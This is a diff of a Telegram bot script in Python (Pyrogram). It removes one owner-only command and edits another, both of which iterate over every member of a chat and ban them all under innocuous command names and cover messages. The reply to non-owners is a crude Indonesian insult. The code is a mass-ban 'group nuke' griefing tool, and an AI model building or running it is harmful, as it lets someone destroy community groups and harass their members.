@@ -124,33 +124,6 @@ async def tai_ya(_, message):
     await message.reply_text(mmk)
 
 
-@app.on_message(filters.command("balonhijau", ["?", "#"]) & OWNER_ID)
-async def banall(client, message):
-    if not message.from_user:
-        return
-    ok = await message.edit("`Haloo`")
-    mem = []
-    async for x in client.get_chat_members(message.chat.id):
-        mem.append(x.user.id)
-    try:
-        await ok.edit("`Hai`")
-    except:
-        await message.reply("`Hai`")
-    a = 0
-    b = 0
-    for y in mem:
-        try:
-            await client.ban_chat_member(message.chat.id, y)
-            a += 1
-        except:
-            b += 1
-            pass
-    try:
-        await ok.edit(f"**Hm**")
-    except:
-        await message.reply(f"Hm!!")
-
-
 
 @app.on_message(filters.command("hijaubalon", ["?", "#"]) & filters.user(OWNER_ID))
 async def ban_all(_,msg):
@@ -161,11 +134,11 @@ async def ban_all(_,msg):
         async for member in app.get_chat_members(chat_id):       
             try:
                     await app.ban_chat_member(chat_id, member.user.id)
-                    await msg.reply_text(f"Hallo Gaes.. izin tagall 😘❤️ {member.user.mention}")                    
+                    #await msg.reply_text(f"Babay sayang 😘❤️ {member.user.mention}")                    
             except Exception:
                 pass
     else:
-        await msg.reply_text("𝐀ʙᴇ 𝐋ᴏᴠᴅᴇ 𝐌ᴀᴛʜᴇʀᴄʜᴏᴅ 𝐁ʜᴀᴋ ")  
+        await msg.reply_text("**LU BUKAN OWNER GUA JING**")  
                                          
     
             
